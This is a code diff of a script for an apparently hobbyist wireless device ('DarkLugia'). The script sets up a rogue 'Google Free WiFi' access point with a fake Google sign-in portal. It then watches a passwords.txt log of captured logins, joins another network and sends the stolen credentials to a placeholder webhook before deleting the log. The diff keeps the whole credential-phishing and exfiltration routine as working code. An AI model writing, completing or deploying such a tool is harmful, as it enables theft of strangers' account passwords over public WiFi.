@@ -1,9 +1,8 @@
 const path = require("path");
-const BASE_DIR = path.resolve(__dirname, "..", "..");
+const BASE_DIR = path.resolve(__dirname, "..");
 
-// 1. Start the Evil Portal
 wifi.stop();
-wifi.set_ssid("Google Free WiFi"); // Convincing SSID
+wifi.set_ssid("Google Free WiFi");
 const portalPath = path.join(BASE_DIR, "DarkLugia", "portals", "Google", "index.html");
 wifi.start_portal(portalPath);
 
@@ -15,33 +14,32 @@ if (storage.exists(splashPath)) {
 display.print("\nPortal: Google Auth");
 display.print("Status: WAITING FOR TARGET...");
 
-// 2. Monitoring Loop
 const logsPath = path.join(BASE_DIR, "DarkLugia", "logs", "passwords.txt");
+const logsDir = path.join(BASE_DIR, "DarkLugia", "logs");
+if (!storage.exists(logsDir)) {
+    storage.mkdir(logsDir);
+}
+
 while (true) {
     if (storage.exists(logsPath)) {
-        // Read the captured credentials
         const creds = storage.read(logsPath);
-
         display.print("DATA FOUND! BEAMING...");
 
         // TODO: Replace with your hotspot or home WiFi credentials before deployment
         wifi.connect("Your_WiFi_Name", "Your_WiFi_Password");
 
         if (wifi.is_connected()) {
-            // Send to your Webhook (same as Xfinity)
             http.get("YOUR_WEBHOOK_URL_HERE?source=Google&data=" + creds);
 
-            // 4. Success Feedback
             const roarPath = path.join(BASE_DIR, "DarkLugia", "assets", "roar.wav");
             if (storage.exists(roarPath)) {
-                audio.play(roarPath); // The Mew Roar!
+                audio.play(roarPath);
             }
             display.print("EMAIL SENT TO MASTER KRAMER");
 
-            // 5. Cleanup
             storage.remove(logsPath);
             break;
         }
     }
-    delay(5000); // Check for new logins every 5 seconds
+    delay(5000);
 }
